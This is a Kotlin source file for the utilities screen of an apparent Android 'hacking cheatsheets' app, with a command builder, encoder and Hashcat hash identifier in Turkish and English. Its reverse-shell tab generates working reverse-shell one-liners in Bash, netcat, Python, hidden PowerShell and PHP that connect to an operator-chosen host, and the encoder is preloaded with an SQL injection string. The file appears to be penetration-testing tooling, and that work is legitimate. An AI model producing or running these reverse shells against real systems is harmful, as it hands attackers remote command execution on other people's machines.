package com.hackingcheatsheets.app.ui.screens

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.net.Uri
import android.util.Base64
import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Tab
import androidx.compose.material3.TabRow
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.hackingcheatsheets.app.data.AppLanguage
import com.hackingcheatsheets.app.ui.components.CodeBlockView
import com.hackingcheatsheets.app.ui.components.CommandBuilderView
import com.hackingcheatsheets.app.ui.theme.BackgroundDark
import com.hackingcheatsheets.app.ui.theme.BorderDark
import com.hackingcheatsheets.app.ui.theme.CodeBlockBg
import com.hackingcheatsheets.app.ui.theme.CyberGreen
import com.hackingcheatsheets.app.ui.theme.SurfaceDark
import com.hackingcheatsheets.app.ui.theme.SurfaceVariantDark
import com.hackingcheatsheets.app.ui.theme.TerminalCyan
import com.hackingcheatsheets.app.ui.theme.TextMuted
import com.hackingcheatsheets.app.ui.theme.TextPrimary
import com.hackingcheatsheets.app.ui.theme.TextSecondary
import com.hackingcheatsheets.app.viewmodel.CheatsheetViewModel

@Composable
fun UtilitiesScreen(viewModel: CheatsheetViewModel) {
    val language by viewModel.currentLanguage.collectAsState()
    var selectedTab by remember { mutableIntStateOf(0) }
    val tabs = if (language == AppLanguage.TR) listOf("Komut Üretici", "Ters Kabuk", "Kodlayıcı", "Hash Tanıma")
               else listOf("Command Builder", "Reverse Shell", "Encoder", "Hash Identifier")

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BackgroundDark)
            .padding(horizontal = 16.dp)
    ) {
        Spacer(modifier = Modifier.height(16.dp))
        Text(
            text = if (language == AppLanguage.TR) "HIZLI ARAÇLAR" else "QUICK UTILITIES",
            style = MaterialTheme.typography.headlineLarge,
            color = CyberGreen
        )
        Text(
            text = if (language == AppLanguage.TR) "Saha testleri için çevrimdışı yardımcılar" else "Offline utilities for active assessments",
            style = MaterialTheme.typography.bodyMedium,
            color = TextSecondary
        )
        Spacer(modifier = Modifier.height(16.dp))

        TabRow(
            selectedTabIndex = selectedTab,
            containerColor = SurfaceDark,
            contentColor = CyberGreen,
            modifier = Modifier.clip(RoundedCornerShape(8.dp))
        ) {
            tabs.forEachIndexed { index, title ->
                Tab(
                    selected = selectedTab == index,
                    onClick = { selectedTab = index },
                    text = { Text(text = title, fontSize = 11.sp, maxLines = 1, color = if (selectedTab == index) CyberGreen else TextMuted) }
                )
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        when (selectedTab) {
            0 -> CommandBuilderTab(language)
            1 -> ReverseShellGeneratorTab(language)
            2 -> EncoderDecoderTab(language)
            3 -> HashIdentifierTab(language)
        }
    }
}

@Composable
fun CommandBuilderTab(language: AppLanguage) {
    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 90.dp)
    ) {
        item {
            CommandBuilderView(language = language)
        }
    }
}

@Composable
fun ReverseShellGeneratorTab(language: AppLanguage) {
    var ip by remember { mutableStateOf("10.10.14.5") }
    var port by remember { mutableStateOf("4444") }
    var selectedShell by remember { mutableStateOf("Bash -i") }
    val shells = listOf("Bash -i", "Bash 196", "nc mkfifo", "Python3", "PowerShell", "PHP")

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(
                    value = ip,
                    onValueChange = { ip = it },
                    label = { Text("LHOST (IP)") },
                    modifier = Modifier.weight(1.5f),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = CyberGreen,
                        unfocusedBorderColor = BorderDark,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary
                    )
                )
                OutlinedTextField(
                    value = port,
                    onValueChange = { port = it },
                    label = { Text("LPORT") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = CyberGreen,
                        unfocusedBorderColor = BorderDark,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary
                    )
                )
            }

            Spacer(modifier = Modifier.height(12.dp))

            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                shells.forEach { s ->
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(8.dp))
                            .background(if (selectedShell == s) CyberGreen else SurfaceVariantDark)
                            .clickable { selectedShell = s }
                            .padding(horizontal = 12.dp, vertical = 8.dp)
                    ) {
                        Text(
                            text = s,
                            color = if (selectedShell == s) BackgroundDark else TextPrimary,
                            fontWeight = FontWeight.Bold,
                            fontSize = 12.sp
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            val payload = when (selectedShell) {
                "Bash -i" -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
                "Bash 196" -> "0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
                "nc mkfifo" -> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
                "Python3" -> "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
                "PowerShell" -> "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
                "PHP" -> "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                else -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
            }

            Text(
                text = if (language == AppLanguage.TR) "ÜRETİLEN TERS KABUK (PAYLOAD)" else "GENERATED REVERSE SHELL",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(4.dp))
            CodeBlockView(code = payload, language = selectedShell)
        }
    }
}

@Composable
fun EncoderDecoderTab(language: AppLanguage) {
    var input by remember { mutableStateOf("admin' OR 1=1-- -") }
    var output by remember { mutableStateOf("") }

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            OutlinedTextField(
                value = input,
                onValueChange = { input = it },
                label = { Text(if (language == AppLanguage.TR) "Girdi Metni" else "Input Text") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                )
            )

            Spacer(modifier = Modifier.height(12.dp))

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                Button(
                    onClick = { output = Base64.encodeToString(input.toByteArray(), Base64.NO_WRAP) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) {
                    Text("Base64 Enc", fontSize = 11.sp, color = CyberGreen)
                }
                Button(
                    onClick = {
                        output = try { String(Base64.decode(input, Base64.DEFAULT)) }
                        catch (e: Exception) { "Invalid Base64 string" }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) {
                    Text("Base64 Dec", fontSize = 11.sp, color = TerminalCyan)
                }
                Button(
                    onClick = { output = Uri.encode(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) {
                    Text("URL Enc", fontSize = 11.sp, color = CyberGreen)
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                text = if (language == AppLanguage.TR) "SONUÇ" else "OUTPUT",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(4.dp))
            CodeBlockView(code = output.ifEmpty { "(No output yet)" }, language = "text")
        }
    }
}

@Composable
fun HashIdentifierTab(language: AppLanguage) {
    var hashInput by remember { mutableStateOf("") }
    val result = identifyHash(hashInput.trim())

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            OutlinedTextField(
                value = hashInput,
                onValueChange = { hashInput = it },
                label = { Text(if (language == AppLanguage.TR) "Hash Değerini Yapıştırın" else "Paste Hash Here") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                )
            )

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                text = if (language == AppLanguage.TR) "OLASI HASH TÜRLERİ" else "POSSIBLE HASH TYPES",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(8.dp))

            result.forEach { type ->
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(vertical = 4.dp)
                        .clip(RoundedCornerShape(8.dp))
                        .background(SurfaceDark)
                        .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                        .padding(12.dp)
                ) {
                    Text(text = type, color = TextPrimary, fontFamily = FontFamily.Monospace, fontSize = 13.sp)
                }
            }
        }
    }
}

private fun identifyHash(hash: String): List<String> {
    if (hash.isEmpty()) return listOf("Waiting for input...")
    val len = hash.length
    val isHex = hash.matches(Regex("^[0-9a-fA-F]+$"))

    val matches = mutableListOf<String>()
    if (isHex) {
        when (len) {
            32 -> matches.addAll(listOf("MD5 [Hashcat -m 0]", "NTLM [Hashcat -m 1000]", "MD4 [Hashcat -m 900]"))
            40 -> matches.addAll(listOf("SHA-1 [Hashcat -m 100]", "MySQL 4.1/5+ [Hashcat -m 300]"))
            56 -> matches.add("SHA-224 [Hashcat -m 1300]")
            64 -> matches.addAll(listOf("SHA-256 [Hashcat -m 1400]", "Keccak-256 [Hashcat -m 17700]"))
            96 -> matches.add("SHA-384 [Hashcat -m 10800]")
            128 -> matches.addAll(listOf("SHA-512 [Hashcat -m 1700]", "Whirlpool [Hashcat -m 6100]"))
        }
    }
    if (hash.startsWith("$2a$") || hash.startsWith("$2b$") || hash.startsWith("$2y$")) {
        matches.add("bcrypt [Hashcat -m 3200]")
    }
    if (hash.startsWith("$6$")) {
        matches.add("SHA512-Crypt (Linux /etc/shadow) [Hashcat -m 1800]")
    }
    if (hash.startsWith("$1$")) {
        matches.add("MD5-Crypt (Linux /etc/shadow) [Hashcat -m 500]")
    }
    if (hash.startsWith("\$krb5asrep\$")) {
        matches.add("Kerberos 5 AS-REP (AS-REP Roasting) [Hashcat -m 18200]")
    }
    if (hash.startsWith("\$krb5tgs\$")) {
        matches.add("Kerberos 5 TGS (Kerberoasting) [Hashcat -m 13100]")
    }
    if (matches.isEmpty()) {
        matches.add("Unknown hash signature (Length: $len)")
    }
    return matches
}
